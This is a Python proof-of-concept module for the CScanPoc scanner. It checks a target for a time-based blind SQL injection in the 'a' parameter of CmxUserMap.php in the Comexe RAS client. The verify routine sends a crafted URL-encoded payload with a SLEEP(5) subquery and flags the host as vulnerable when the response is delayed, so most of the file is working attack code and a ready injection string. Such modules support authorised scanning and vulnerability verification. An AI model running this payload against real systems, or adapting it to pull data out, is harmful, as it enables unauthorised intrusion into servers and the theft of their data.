# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'comexe_0007' # 平台漏洞编号，留空
    name = '科迈RAS标准版客户端CmxUserMap.php页面a参数注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-06'  # 漏洞公布时间
    desc = '''
        科迈RAS标准版客户端CmxUserMap.php页面a参数注入 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0117921' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '科迈RAS系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'comexe_0007' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/Server/CmxUserMap.php?t=&a=123&b=32&c=undefined&d='
            target = arg + payload
            fst_sta=time.time()
            code, head, res, errcode, _ = hh.http(target)
            fst_end=time.time()

            
            payload = "/Server/CmxUserMap.php?t=&a=123%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20%27aSBL%27=%27aSBL&b=32&c=undefined&d="
            target=arg+payload
            sec_sta=time.time()
            code1, head1, res1, errcode1, _ = hh.http(target)
            sec_end=time.time()

            fst=fst_end-fst_sta
            sec=sec_end-sec_sta

            
            if code==code1 and fst<2 and sec>5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()